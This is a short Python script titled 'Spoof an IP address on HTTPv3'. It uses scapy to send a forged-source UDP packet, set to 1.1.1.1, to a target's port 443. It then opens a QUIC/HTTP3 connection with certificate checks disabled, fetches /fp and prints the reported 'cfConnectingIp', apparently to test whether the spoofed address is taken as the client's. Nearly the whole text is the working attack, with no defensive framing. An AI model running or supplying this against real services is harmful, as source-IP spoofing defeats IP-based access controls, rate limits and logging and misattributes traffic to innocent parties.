# Spoof an IP address on HTTPv3

import sys
import socket
import ssl
import json
import time
import select
import urllib.request
import os
from scapy.all import IP
from scapy.all import UDP
from scapy.all import Raw
from scapy.all import send
from scapy.all import conf
from aioquic.quic.connection import QuicConnection
from aioquic.quic.configuration import QuicConfiguration
from aioquic.h3.connection import H3Connection
from aioquic.h3.events import HeadersReceived
from aioquic.h3.events import DataReceived

conf.verb=0

cid=os.urandom(8)
p=b"\xc0"+b"\x00\x00\x00\x01"+bytes([len(cid)])+cid+b"\x00\x00\x08"+b"\x00"*8
pkt=IP(src="1.1.1.1",dst=socket.gethostbyname("<domain>"))/UDP(sport=50000,dport=443)/Raw(p)
send(pkt)

time.sleep(0.5)

cfg=QuicConfiguration(is_client=True,alpn_protocols=["h3"])
cfg.verify_mode=ssl.CERT_NONE
cfg.server_name="<>"
q=QuicConnection(configuration=cfg)
h3=None
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
sock.bind(("0.0.0.0",0))
sock.setblocking(False)

q.connect((socket.gethostbyname("<>"),443),now=time.monotonic())
for d,a in q.datagrams_to_send(now=time.monotonic()):
    sock.sendto(d,a)

st=time.monotonic()
while True:
    elapsed=time.monotonic()-st
    if elapsed>10:
        break
    timer=q.get_timer()
    if timer:
        to=timer-time.monotonic()
        if to<0:
            to=0
        if to>0.2:
            to=0.2
    else:
        to=0.05
    r,_,_=select.select([sock],[],[],to)
    if r:
        try:
            d,a=sock.recvfrom(65536)
            q.receive_datagram(d,a,now=time.monotonic())
        except:
            pass
    if q.get_timer():
        if time.monotonic()>=q.get_timer():
            q.handle_timer(now=time.monotonic())
    ev=q.next_event()
    while ev:
        if 'HandshakeCompleted' in str(type(ev)):
            h3=H3Connection(q)
        if h3:
            for hev in h3.handle_event(ev):
                pass
        ev=q.next_event()
    for d,a in q.datagrams_to_send(now=time.monotonic()):
        try:
            sock.sendto(d,a)
        except:
            pass

sid=q.get_next_available_stream_id()
h3.send_headers(sid,[(b":method",b"GET"),(b":scheme",b"https"),(b":authority",b"<>"),(b":path",b"/fp")],end_stream=True)
for d,a in q.datagrams_to_send(now=time.monotonic()):
    sock.sendto(d,a)

body=b""
st=time.monotonic()
while True:
    elapsed=time.monotonic()-st
    if elapsed>12:
        break
    timer=q.get_timer()
    if timer:
        to=timer-time.monotonic()
        if to<0:
            to=0
        if to>0.2:
            to=0.2
    else:
        to=0.05
    r,_,_=select.select([sock],[],[],to)
    if r:
        try:
            d,a=sock.recvfrom(65536)
            q.receive_datagram(d,a,now=time.monotonic())
        except:
            pass
    if q.get_timer():
        if time.monotonic()>=q.get_timer():
            q.handle_timer(now=time.monotonic())
    ev=q.next_event()
    while ev:
        if h3:
            for hev in h3.handle_event(ev):
                if 'DataReceived' in str(type(hev)):
                    body=body+hev.data
        ev=q.next_event()
    for d,a in q.datagrams_to_send(now=time.monotonic()):
        try:
            sock.sendto(d,a)
        except:
            pass

cip=None
try:
    j=json.loads(body.decode())
    cip=j['endpoint']['ipInfo']['cfConnectingIp']
except:
    pass

print(cip)